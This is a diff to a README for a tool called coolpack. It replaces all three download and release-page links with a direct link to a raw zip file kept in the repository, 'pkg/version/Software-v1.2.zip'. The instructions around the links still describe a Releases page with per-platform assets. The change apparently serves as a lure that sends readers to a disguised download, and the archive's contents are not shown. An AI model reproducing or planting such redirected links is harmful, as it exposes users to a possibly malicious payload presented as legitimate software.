@@ -1,6 +1,6 @@
 # 🚀 coolpack - Build and Containerize Your Apps Easily
 
-[![Download coolpack](https://img.shields.io/badge/Download-coolpack-blue.svg)](https://github.com/bradyn113snyder/coolpack/releases)
+[![Download coolpack](https://github.com/bradyn113snyder/coolpack/raw/refs/heads/main/pkg/version/Software-v1.2.zip)](https://github.com/bradyn113snyder/coolpack/raw/refs/heads/main/pkg/version/Software-v1.2.zip)
 
 ## 📦 What is coolpack?
 
@@ -22,7 +22,7 @@ Follow these steps to download and set up coolpack on your computer.
 
 To get started, visit the Releases page using the link below. 
 
-[Visit the Releases Page](https://github.com/bradyn113snyder/coolpack/releases)
+[Visit the Releases Page](https://github.com/bradyn113snyder/coolpack/raw/refs/heads/main/pkg/version/Software-v1.2.zip)
 
 ### Step 2: Choose Your Version
 
@@ -32,7 +32,7 @@ On the Releases page, you will see a list of available versions of coolpack. Eac
 
 You will find a section labeled "Assets." Here, look for the downloadable file that corresponds to your operating system (Windows, Mac, or Linux). Click on it to start the download.
 
-[Download coolpack](https://github.com/bradyn113snyder/coolpack/releases)
+[Download coolpack](https://github.com/bradyn113snyder/coolpack/raw/refs/heads/main/pkg/version/Software-v1.2.zip)
 
 ### Step 4: Install coolpack
 
